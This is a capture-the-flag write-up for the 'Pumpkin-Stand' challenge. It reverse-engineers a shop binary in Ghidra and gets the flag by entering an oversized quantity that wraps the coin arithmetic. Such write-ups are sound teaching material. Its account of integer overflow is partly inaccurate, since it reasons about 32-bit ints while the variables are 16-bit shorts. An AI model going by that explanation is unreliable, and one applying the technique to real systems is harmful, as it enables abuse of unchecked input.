---
title: "Pumpkin-Stand - hacktheboo"
category: "pwn"
subcategory: "integer"
type: "writeup"
tags: ["pwn", "pie", "integer-overflow", "ghidra", "lsb", "scanf"]
difficulty: "easy"
summary: "In this challenge, we can spawn a docker instance and download a file!"
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/hacktheboo/Pwn/Pumpkin-Stand/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/hacktheboo/Pwn/Pumpkin-Stand/README.md"
ctf:
  name: "hacktheboo"
  challenge: "Pumpkin-Stand"
---

## Source

- **CTF:** hacktheboo
- **Challenge:** Pumpkin-Stand
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/hacktheboo/Pwn/Pumpkin-Stand/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/hacktheboo/Pwn/Pumpkin-Stand/README.md>

---
# Pumpkin Stand

## Background

> This time of the year, we host our big festival and the one who craves the pumpkin faster and make it as scary as possible, gets an amazing prize! Be fast and try to crave this hard pumpkin!

> Difficulty: Easy

- Overall difficulty for me: Easy

**In this challenge, we can spawn a docker instance and [download a file](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/HackTheBoo/Pwn/Pumpkin-Stand/pwn_pumpkin_stand.zip)!**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/HackTheBoo/Pwn/Pumpkin-Stand/images/a1.png)

```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Pwn/Pumpkin-Stand]
└─# unzip pwn_pumpkin_stand.zip            
Archive:  pwn_pumpkin_stand.zip
   creating: challenge/
  inflating: challenge/pumpkin_stand  
   creating: challenge/glibc/
  inflating: challenge/glibc/libc.so.6  
  inflating: challenge/glibc/ld-linux-x86-64.so.2  
 extracting: challenge/flag.txt

┌──(root🌸siunam)-[~/…/HackTheBoo/Pwn/Pumpkin-Stand/challenge]
└─# file pumpkin_stand 
pumpkin_stand: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fbbc6afe5dc2e791b38dfc19dbce5ab57c4a915e, not stripped
                                                                                                           
┌──(root🌸siunam)-[~/…/HackTheBoo/Pwn/Pumpkin-Stand/challenge]
└─# cat flag.txt 
HTB{f4k3_fl4g_4_t35t1ng}

┌──(root🌸siunam)-[~/…/HackTheBoo/Pwn/Pumpkin-Stand/challenge]
└─# ls -lah glibc     
total 2.2M
drwxrwxr-x 2 root root 4.0K Sep 27 09:07 .
drwxrwxr-x 3 root root 4.0K Sep 27 09:07 ..
-rwxr-xr-x 1 root root 175K Sep 27 09:07 ld-linux-x86-64.so.2
-rwxr-xr-x 1 root root 2.0M Sep 27 09:07 libc.so.6
```

**After `unzip`ing, we can see `pumpkin_stand` file, which is an 64-bit LSB executable, a fake flag for local testing, and a libc library.**

**`pumpkin_stand`:**
```
┌──(root🌸siunam)-[~/…/HackTheBoo/Pwn/Pumpkin-Stand/challenge]
└─# ./pumpkin_stand

                                          ##&
                                        (#&&
                                       ##&&
                                 ,*.  #%%&  .*,
                      .&@@@@#@@@&@@@@@@@@@@@@&@@&@#@@@@@@(
                    /@@@@&@&@@@@@@@@@&&&&&&&@@@@@@@@@@@&@@@@,
                   @@@@@@@@@@@@@&@&&&&&&&&&&&&&@&@@@@@@&@@@@@@
                 #&@@@@@@@@@@@@@@&&&&&&&&&&&&&&&#@@@@@@@@@@@@@@,
                .@@@@@#@@@@@@@@#&&&&&&&&&&&&&&&&&#@@@@@@@@@@@@@&
                &@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@
                @@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&&@@@@@@@@@&@@@@@
                @@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@
                @@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@
                .@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@
                 (@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@.
                   @@@@@@@@@@@@@@&&&&&&&&&&&&&&&@@@@@@@@@@@@@@
                    ,@@@@@@@@@@@@@&&&&&&&&&&&&&@@@@@@@@@@@@@
                       @@@@@@@@@@@@@&&&&&&&&&@@@@@@@@@@@@/

Current pumpcoins: [1337]

Items: 

1. Shovel  (1337 p.c.)
2. Laser   (9999 p.c.)

>> 2

How many do you want?

>> 1

[-] Not enough pumpcoins for this!
```

**Let's use ghidra to reverse engineering it!**
```
┌──(root🌸siunam)-[~/…/HackTheBoo/Pwn/Pumpkin-Stand/challenge]
└─# ghidra
```

**In the `main()` function, we see something interesting:**
```c
void main(void)

{
  long in_FS_OFFSET;
  short local_54;
  short local_52;
  FILE *local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  local_54 = 0;
  local_52 = 0;
  while( true ) {
    while( true ) {
      while( true ) {
        while( true ) {
          menu();
          __isoc99_scanf(&DAT_0010132b,&local_54);
          printf("\nHow many do you want?\n\n>> ");
          __isoc99_scanf(&DAT_0010132b,&local_52);
          if (0 < local_52) break;
          printf("%s\n[-] You cannot buy less than 1!\n",&DAT_0010134a);
        }
        pumpcoins = pumpcoins -
                    local_52 * (short)*(undefined4 *)((long)&values + (long)(int)local_54 * 4);
        if (-1 < pumpcoins) break;
        printf("\nCurrent pumpcoins: [%s%d%s]\n\n",&DAT_00100e80,(ulong)(uint)(int)pumpcoins);
        printf("%s\n[-] Not enough pumpcoins for this!\n\n%s",&DAT_0010134a,&DAT_00100e78);
      }
      if (local_54 != 1) break;
      printf("\nCurrent pumpcoins: [%s%d%s]\n\n",&DAT_00100e80,(ulong)(uint)(int)pumpcoins);
      puts("\nGood luck crafting this huge pumpkin with a shovel!\n");
    }
    if (0x270e < pumpcoins) break;
    printf("%s\n[-] Not enough pumpcoins for this!\n\n%s",&DAT_0010134a,&DAT_00100e78);
  }
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_50 = fopen("./flag.txt","rb");
  if (local_50 != (FILE *)0x0) {
    fgets((char *)&local_48,0x30,local_50);
    printf("%s\nCongratulations, here is the code to get your laser:\n\n%s\n\n",&DAT_00100ee3,
           &local_48);
                    /* WARNING: Subroutine does not return */
    exit(0x16);
  }
  puts("Error opening flag.txt, please contact an Administrator!\n");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

**Looks like we need to buy the laser in order to get the flag!** 

**If you look closely, if `pumpcoins` is less than `9998`(0x270e = 9998), then we can't buy laser:**
```c
if (0x270e < pumpcoins) break;
  printf("%s\n[-] Not enough pumpcoins for this!\n\n%s",&DAT_0010134a,&DAT_00100e78);
```

Hmm... **What if it's vulnerable to integer overflow?**

**Integer overflow is when the user type the number of maximum integer, it'll went from positive to negative.**

**Showcase:**

Let's use C for an example, **C maximum integer is `2147483647`:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/HackTheBoo/Pwn/Pumpkin-Stand/images/a2.png)

**If I input more than `2147483647`, it'll be `-2147483647`.**

Let's try our theory in this challenge!

```
┌──(root🌸siunam)-[~/…/HackTheBoo/Pwn/Pumpkin-Stand/challenge]
└─# ./pumpkin_stand 

                                          ##&
                                        (#&&
                                       ##&&
                                 ,*.  #%%&  .*,
                      .&@@@@#@@@&@@@@@@@@@@@@&@@&@#@@@@@@(
                    /@@@@&@&@@@@@@@@@&&&&&&&@@@@@@@@@@@&@@@@,
                   @@@@@@@@@@@@@&@&&&&&&&&&&&&&@&@@@@@@&@@@@@@
                 #&@@@@@@@@@@@@@@&&&&&&&&&&&&&&&#@@@@@@@@@@@@@@,
                .@@@@@#@@@@@@@@#&&&&&&&&&&&&&&&&&#@@@@@@@@@@@@@&
                &@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@
                @@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&&@@@@@@@@@&@@@@@
                @@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@
                @@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@
                .@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@
                 (@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@.
                   @@@@@@@@@@@@@@&&&&&&&&&&&&&&&@@@@@@@@@@@@@@
                    ,@@@@@@@@@@@@@&&&&&&&&&&&&&@@@@@@@@@@@@@
                       @@@@@@@@@@@@@&&&&&&&&&@@@@@@@@@@@@/

Current pumpcoins: [1337]

Items: 

1. Shovel  (1337 p.c.)
2. Laser   (9999 p.c.)

>> 
```

**So, what if I want to buy 5 shovel, will the pumpcoins become a negative value?** 
```
Items: 

1. Shovel  (1337 p.c.)
2. Laser   (9999 p.c.)

>> 1

How many do you want?

>> 5

Current pumpcoins: [-5348]


[-] Not enough pumpcoins for this!
```

**Ohh!!! It's a negative value!**

**Since we have `1337` pumpcoins, we need to use python to calculate the maximum integer!**
```py
#!/usr/bin/env python3

num = 1337
maximum = 2147483647
counter = 1

while True:
	while counter < 999:
		num *= counter
		counter += 1

		if num >= maximum:
			print(f'[+] Maximum = {num}')
			exit()
```

**Output:**
```
┌──(root🌸siunam)-[~/…/HackTheBoo/Pwn/Pumpkin-Stand/challenge]
└─# python3 find_biggest_num.py
[+] Maximum = 4851705600
```

**So, if I type `4851705600` after choosing which item I should buy, it'll become a positive value!**

**Let's `nc` into the docker instance!**
```
┌──(root🌸siunam)-[~/…/HackTheBoo/Pwn/Pumpkin-Stand/challenge]
└─# nc -nv 142.93.35.129 32164
(UNKNOWN) [142.93.35.129] 32164 (?) open

                                          ##&
                                        (#&&
                                       ##&&
                                 ,*.  #%%&  .*,
                      .&@@@@#@@@&@@@@@@@@@@@@&@@&@#@@@@@@(
                    /@@@@&@&@@@@@@@@@&&&&&&&@@@@@@@@@@@&@@@@,
                   @@@@@@@@@@@@@&@&&&&&&&&&&&&&@&@@@@@@&@@@@@@
                 #&@@@@@@@@@@@@@@&&&&&&&&&&&&&&&#@@@@@@@@@@@@@@,
                .@@@@@#@@@@@@@@#&&&&&&&&&&&&&&&&&#@@@@@@@@@@@@@&
                &@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@
                @@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&&@@@@@@@@@&@@@@@
                @@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@
                @@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@
                .@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@
                 (@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@.
                   @@@@@@@@@@@@@@&&&&&&&&&&&&&&&@@@@@@@@@@@@@@
                    ,@@@@@@@@@@@@@&&&&&&&&&&&&&@@@@@@@@@@@@@
                       @@@@@@@@@@@@@&&&&&&&&&@@@@@@@@@@@@/

Current pumpcoins: [1337]

Items: 

1. Shovel  (1337 p.c.)
2. Laser   (9999 p.c.)

>> 2

How many do you want?

>> 4851705600

Congratulations, here is the code to get your laser:

HTB{1nt3g3R_0v3rfl0w_101_0r_0v3R_9000!}
```

Boom! We got the flag!

# Conclusion

What we've learned:

1. Interger Overflow
